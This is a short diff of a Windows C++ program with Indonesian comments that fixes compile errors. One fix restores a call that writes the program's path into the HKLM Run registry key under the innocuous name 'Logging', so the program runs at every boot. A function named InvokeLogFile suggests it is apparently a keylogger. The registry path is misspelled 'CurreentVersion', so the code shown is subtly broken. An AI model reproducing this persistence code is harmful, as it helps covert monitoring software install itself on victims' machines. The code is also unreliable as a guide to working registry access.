@@ -6,7 +6,8 @@
 #include <windows.h>
 #include <cstdio>
 #include <iostream>
-#include "regaccess.h"
+
+#include "regacces.h"
 
 using namespace std;
 
@@ -22,7 +23,11 @@ char szCurrent[MAX_PATH] = {'\0'};
 
 int WINAPI WinMain(HINSTANCE hThisInstance,
                    HINSTANCE hPrevInstance,
-                   LPSTR lpszArgument, int nDunsterStil)
+                   LPSTR lpszArgument, int nFunsterStil)
+                   
+// ini aslinya                   
+//                   LPSTR lpszArgument, int nDunsterStil)
+
 {
     HWND hwnd;
     MSG messages;
@@ -55,7 +60,10 @@ GetSystemDirectory(szPath, sizeof(szPath));
 strncat(szPath, "\\", MAX_PATH-1);
 strncat(szCurrent, szPath, true);
 
-SetStringValue(HKLM
+// ini aslinya
+//SetStringValue(HKLM
+
+SetStringValue(HKLM,
                "SOFTWARE\\Microsoft\\Windows\\CurreentVersion\\Run",
                "Logging",
                szPath);
@@ -364,4 +372,3 @@ void InvokeLogFile(void)
 }
     ini yang salah posisi
    -------------------------------------------- */
-
